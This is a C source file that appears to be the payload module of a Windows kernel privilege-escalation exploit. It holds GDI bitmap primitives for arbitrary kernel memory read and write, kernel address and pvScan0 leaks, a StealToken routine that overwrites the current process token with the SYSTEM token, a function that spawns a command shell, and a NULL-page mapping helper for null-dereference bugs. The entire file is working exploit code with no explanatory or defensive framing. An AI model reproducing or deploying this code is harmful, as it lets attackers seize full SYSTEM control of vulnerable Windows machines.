#include "payloads.h"



BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{

	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}


LONG BitmapArbitraryRead(HBITMAP hManager, HBITMAP hWorker, LPVOID lpReadAddress, LPVOID lpReadResult, DWORD dwReadLen)
{
	SetBitmapBits(hManager, dwReadLen, &lpReadAddress);		// Set Workers pvScan0 to the Address we want to read. 
	return GetBitmapBits(hWorker, dwReadLen, lpReadResult); // Use Worker to Read result into lpReadResult Pointer.
}

LONG BitmapArbitraryWrite(HBITMAP hManager, HBITMAP hWorker, LPVOID lpWriteAddress, LPVOID lpWriteValue, DWORD dwWriteLen)
{
	SetBitmapBits(hManager, dwWriteLen, &lpWriteAddress);     // Set Workers pvScan0 to the Address we want to write.
	return SetBitmapBits(hWorker, dwWriteLen, &lpWriteValue); // Use Worker to Write at Arbitrary Kernel address.
}

#ifdef _WIN64
PPEB64 GetPEB(HANDLE hProcess)
{
	PROCESS_BASIC_INFORMATION pbi;
	PPEB64 peb;
	HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
	if (!hNtdll)
	{
		LogMessage(L_ERROR, TEXT("ntdll get error !"));
		exit(1);
	}

	NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (!NtQueryInformationProcess)
	{
		LogMessage(L_ERROR, TEXT("NtQueryInformationProcess get error!"));
		exit(1);
	}

	NTSTATUS result = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);
	LogMessage(L_INFO, TEXT("result is %d"), result);
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL))
	{
		LogMessage(L_ERROR, TEXT("read peb error !"));
		CloseHandle(hProcess);
		exit(1);
	}
	return peb;
}
#else
PPEB32 GetPEB(HANDLE hProcess)
{
	PROCESS_BASIC_INFORMATION pbi;
	PPEB32 peb;
	HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
	if (!hNtdll)
	{
		LogMessage(L_ERROR, TEXT("ntdll get error !"));
		exit(1);
	}

	NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (!NtQueryInformationProcess)
	{
		LogMessage(L_ERROR, TEXT("NtQueryInformationProcess get error!"));
		exit(1);
	}

	NTSTATUS result = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);
	LogMessage(L_INFO, TEXT("result is %d"), result);
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL))
	{
		LogMessage(L_ERROR, TEXT("read peb error !"));
		CloseHandle(hProcess);
		exit(1);
	}
	return peb;
}
#endif


#ifdef _WIN64
PPEB64 GetProcessPEB(HANDLE hProcess, DWORD dwPID)
{
	PROCESS_BASIC_INFORMATION pbi;
	PPEB64 peb;


	NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	if (NtQueryInformationProcess == NULL) {
		LogMessage(L_ERROR, L"Unable to get Module handle!");
		exit(1);
	}

	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi.PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		LogMessage(L_ERROR, L"Unable to read Process Memory!");
		CloseHandle(hProcess);
		exit(1);
	}

	LogMessage(L_INFO, L"PEB Address is at: 0x%p", (LPVOID)peb);

	return peb;
}
#else
PPEB32 GetProcessPEB(HANDLE hProcess, DWORD dwPID)
{
	PROCESS_BASIC_INFORMATION pbi;
	PPEB32 peb;


	NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	if (NtQueryInformationProcess == NULL) {
		LogMessage(L_ERROR, L"Unable to get Module handle!");
		exit(1);
	}

	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi.PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		LogMessage(L_ERROR, L"Unable to read Process Memory!");
		CloseHandle(hProcess);
		exit(1);
	}

	LogMessage(L_INFO, L"PEB Address is at: 0x%p", (LPVOID)peb);

	return peb;
}
#endif



FARPROC GetEProcess(LPCSTR PsInitial)
{
	ULONG ReturnLength;
	PSYSTEM_MODULE_INFORMATION ModuleHandle;
	LPVOID KernelBase;
	PUCHAR KernelImage;
	PUCHAR lpKernelName;
	HMODULE NtdllAddr;
	FARPROC PsInitialAddr;
	FARPROC pLiveFunctionAddress;
	NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL)
	{
		LogMessage(L_ERROR, TEXT("NtQuerySystemInformation get error!"));
		exit(1);
	}
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);
	ModuleHandle = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleHandle)
	{
		LogMessage(L_ERROR, TEXT("get module handle error!"));
		exit(1);
	}
	NtQuerySystemInformation(SystemModuleInformation, ModuleHandle, ReturnLength, &ReturnLength);
	KernelBase = ModuleHandle->Module[0].ImageBase;
	KernelImage = ModuleHandle->Module[0].FullPathName;
	lpKernelName = ModuleHandle->Module[0].FullPathName + ModuleHandle->Module[0].OffsetToFileName;
	LogMessage(L_INFO, TEXT("kernelBase is 0x%p"), KernelBase);
	LogMessage(L_INFO, TEXT("kernelImage is %S"), KernelImage);
	LogMessage(L_INFO, TEXT("lpKernelName is %S"), lpKernelName);
	LogMessage(L_INFO, TEXT("NumberOfModules is %d"), ModuleHandle->NumberOfModules);
	NtdllAddr = LoadLibraryExA((LPCSTR)lpKernelName, 0, 0);
	//test = LoadLibrary(L"ntoskrnl.exe");
	LogMessage(L_INFO, TEXT("NtdllAddr is 0x%p"), NtdllAddr);
	PsInitialAddr = GetProcAddress(NtdllAddr, PsInitial);
	LogMessage(L_INFO, TEXT("PsInitialAddr is 0x%p"), PsInitialAddr);
	pLiveFunctionAddress = (FARPROC)((PUCHAR)PsInitialAddr - (PUCHAR)NtdllAddr + (PUCHAR)KernelBase);
	LogMessage(L_INFO, TEXT("pLiveFunctionAddress is 0x%p"), pLiveFunctionAddress);
	FreeLibrary(NtdllAddr);
	VirtualFree(ModuleHandle, ReturnLength, MEM_RELEASE);
	return pLiveFunctionAddress;
}

FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
{
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	LPVOID kernelBase = NULL;
	PUCHAR kernelImage = NULL;
	HMODULE hUserSpaceKernel;
	LPCSTR lpKernelName = NULL;
	FARPROC pUserKernelSymbol = NULL;
	FARPROC pLiveFunctionAddress = NULL;

	NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
		if (NtQuerySystemInformation == NULL)
		{
			LogMessage(L_ERROR, TEXT("NtQuerySystemInformation get error!"));
			exit(1);
		}
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBase;
	kernelImage = ModuleInfo->Module[0].FullPathName;

	/* Find exported Kernel Functions */

	lpKernelName = (LPCSTR)ModuleInfo->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName;

	hUserSpaceKernel = LoadLibraryExA(lpKernelName, 0, 0);
	if (hUserSpaceKernel == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pUserKernelSymbol = GetProcAddress(hUserSpaceKernel, lpSymbolName);
	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpaceKernel + (PUCHAR)kernelBase);

	FreeLibrary(hUserSpaceKernel);
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return pLiveFunctionAddress;
}

#ifdef _WIN64
ULONG64 GetPvScan0(PPEB64 peb, HBITMAP hBitmap)
{
	GDICELL gdicell;
	ULONG64 pvScan0;
	gdicell = *(PGDICELL)((ULONG)peb->GdiSharedHandleTable + LOWORD(hBitmap) * sizeof(GDICELL));
	LogMessage(L_DEBUG, TEXT("***GdiSharedHandleTable is 0x%p"), peb->GdiSharedHandleTable);
	LogMessage(L_DEBUG, TEXT("gdicell is 0x%p"), gdicell);
	pvScan0 = (ULONG64)gdicell.pKernelAddress + PVSCAN0_OFFSET;
	LogMessage(L_DEBUG, TEXT("PVSCAN0_OFFSET is 0x%p"), PVSCAN0_OFFSET);
	LogMessage(L_DEBUG, TEXT("pvscan0 is 0x%p"), pvScan0);
	return pvScan0;

}
#else
ULONG GetPvScan0(PPEB32 peb, HBITMAP hBitmap)
{
	GDICELL gdicell;
	ULONG pvScan0;
	gdicell = *(PGDICELL)((ULONG)peb->GdiSharedHandleTable + LOWORD(hBitmap) * sizeof(GDICELL));
	LogMessage(L_DEBUG, TEXT("***GdiSharedHandleTable is 0x%p"), peb->GdiSharedHandleTable);
	LogMessage(L_DEBUG, TEXT("gdicell is 0x%p"), gdicell);
	pvScan0 = (ULONG)gdicell.pKernelAddress + PVSCAN0_OFFSET;
	LogMessage(L_DEBUG, TEXT("PVSCAN0_OFFSET is 0x%p"), PVSCAN0_OFFSET);
	LogMessage(L_DEBUG, TEXT("pvscan0 is 0x%p"), pvScan0);
	return pvScan0;

}
#endif



/*
LeakBitmapInfo GDILeakBitmap(HANDLE hProcess, PPEB peb, DWORD dwOffsetToPvScan0)
{
	PGDICELL gdiCell;
	LeakBitmapInfo BitmapInfo;


	BYTE buf[0x64 * 0x64 * 4];
	BitmapInfo.hBitmap = CreateBitmap(0x64, 0x64, 1, 32, &buf);

	// Read PEB->GdiSharedHandleTable Address into GDICELL Structure
	if (!ReadProcessMemory(hProcess, &peb->GdiSharedHandleTable, &gdiCell, sizeof(gdiCell), NULL)) {
		LogMessage(L_ERROR, L"Unable to read Process Memory!");
		CloseHandle(hProcess);
		exit(1);
	}

	LogMessage(L_INFO, L"GdiSharedHandleTable is at: 0x%p", (LPVOID)gdiCell);
	LogMessage(L_INFO, L"********GdiSharedHandleTable is at: 0x%p", peb->GdiSharedHandleTable);

	GDICELL gManagerCell = *((PGDICELL)((PUCHAR)gdiCell + LOWORD(BitmapInfo.hBitmap) * sizeof(GDICELL)));
	LogMessage(L_INFO, TEXT("---------------------------the size of gdiccell is %d"), sizeof(GDICELL));
	LogMessage(L_INFO, TEXT("*************************gManagerCell is 0x%p"), gManagerCell);
	BitmapInfo.pBitmapPvScan0 = (PUCHAR)gManagerCell.pKernelAddress + dwOffsetToPvScan0;

	LogMessage(L_INFO, L"Bitmap Handle at: 0x%08x", (ULONG)BitmapInfo.hBitmap);
	LogMessage(L_INFO, L"Bitmap Kernel Object: 0x%p", gManagerCell.pKernelAddress);
	LogMessage(L_INFO, L"Bitmap pvScan0 Pointer: 0x%p", BitmapInfo.pBitmapPvScan0);

	return BitmapInfo;
}
*/

void StealToken(HBITMAP ManagerBitmap, HBITMAP WorkerBitmap, DWORD dwPID)
{
	PVOID lpSystemEPROCESS = NULL;
	PVOID lpSysProcID = NULL;
	LIST_ENTRY leNextProcessLink;
	PVOID lpSystemToken = NULL;
	
#ifdef _WIN64
	DWORD dwUniqueProcessIdOffset = 0x180;
	DWORD dwTokenOffset = 0x208;
	DWORD dwActiveProcessLinks = 0x188;
#else
	DWORD dwUniqueProcessIdOffset = 0x0b4;
	DWORD dwTokenOffset = 0x0f8;
	DWORD dwActiveProcessLinks = 0x0b8;
#endif

	LPCSTR lpFunctionName = "PsInitialSystemProcess";
	FARPROC fpFunctionAddress = KernelSymbolInfo(lpFunctionName);
	LogMessage(L_DEBUG, TEXT("fpFunctionAddress is: %p"), fpFunctionAddress);
	BitmapArbitraryRead(ManagerBitmap, WorkerBitmap, (PVOID)fpFunctionAddress, &lpSystemEPROCESS, sizeof(PVOID));
	LogMessage(L_INFO, TEXT("lpSystemEPROCESS is %p"), lpSystemEPROCESS);
	BitmapArbitraryRead(ManagerBitmap, WorkerBitmap, (PUCHAR)lpSystemEPROCESS + dwUniqueProcessIdOffset, &lpSysProcID, sizeof(PVOID));
	BitmapArbitraryRead(ManagerBitmap, WorkerBitmap, (PUCHAR)lpSystemEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
	BitmapArbitraryRead(ManagerBitmap, WorkerBitmap, (PUCHAR)lpSystemEPROCESS + dwTokenOffset, &lpSystemToken, sizeof(PVOID));
	LogMessage(L_INFO, TEXT("System Token is : 0x%p"), lpSystemToken);

	dwPID = GetCurrentProcessId();
	LogMessage(L_INFO, TEXT("Current Process PID is: %d"), dwPID);
	//found current process pid and token address
	LPVOID lpNextEPROCESS = NULL;
	LPVOID lpCurrentPID = NULL;
	LPVOID lpCurrentToken = NULL;
	DWORD dwCurrentPID;
	do {
		lpNextEPROCESS = (PUCHAR)leNextProcessLink.Flink - dwActiveProcessLinks;
		BitmapArbitraryRead(ManagerBitmap, WorkerBitmap, (PUCHAR)lpNextEPROCESS + dwUniqueProcessIdOffset, &lpCurrentPID, sizeof(PVOID));
		BitmapArbitraryRead(ManagerBitmap, WorkerBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, &lpCurrentToken, sizeof(PVOID));

		// Read _LIST_ENTRY to next Active _EPROCESS Structure
		BitmapArbitraryRead(ManagerBitmap, WorkerBitmap, (PUCHAR)lpNextEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));

		dwCurrentPID = LOWORD(lpCurrentPID);

	} while (dwCurrentPID != dwPID);

	LogMessage(L_INFO, TEXT("Current _EPROCESS Token address is at: 0x%p"), (PUCHAR)lpNextEPROCESS + dwTokenOffset);
	LogMessage(L_INFO, TEXT("Current Process Token is: 0x%p"), lpCurrentToken);

	BitmapArbitraryWrite(ManagerBitmap, WorkerBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, lpSystemToken, sizeof(PVOID));

	LogMessage(L_INFO, TEXT("Stealing Token success!!"));
}


void PopShell()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(CMD, NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
}

BOOL MapNullPage() {
	HMODULE hNtdll;
	SIZE_T RegionSize = 0x1000;            // will be rounded up to the next host
										   // page size address boundary -> 0x2000

	PVOID BaseAddress = (PVOID)0x00000001; // will be rounded down to the next host
										   // page size address boundary -> 0x00000000
	NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

	hNtdll = GetModuleHandle(L"ntdll.dll");

	// Grab the address of NtAllocateVirtualMemory
	NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

	if (!NtAllocateVirtualMemory) {
		LogMessage(L_ERROR,TEXT("[-] Failed Resolving NtAllocateVirtualMemory: 0x%X"), GetLastError());
		exit(EXIT_FAILURE);
	}

	// Allocate the Virtual memory
#ifdef _WIN64
	NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFFFFFFFFFF,
		&BaseAddress,
		0,
		&RegionSize,
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE);
#else
	NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
		&BaseAddress,
		0,
		&RegionSize,
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE);
#endif

	if (NtStatus != STATUS_SUCCESS) {
		LogMessage(L_ERROR,TEXT("[-] Virtual Memory Allocation Failed: 0x%x"), NtStatus);
		exit(EXIT_FAILURE);
	}
	else {
		LogMessage(L_INFO,TEXT("[+] Memory Allocated: 0x%p"), BaseAddress);
		LogMessage(L_INFO,TEXT("[+] Allocation Size: 0x%X"), RegionSize);
	}

	FreeLibrary(hNtdll);

	return TRUE;
}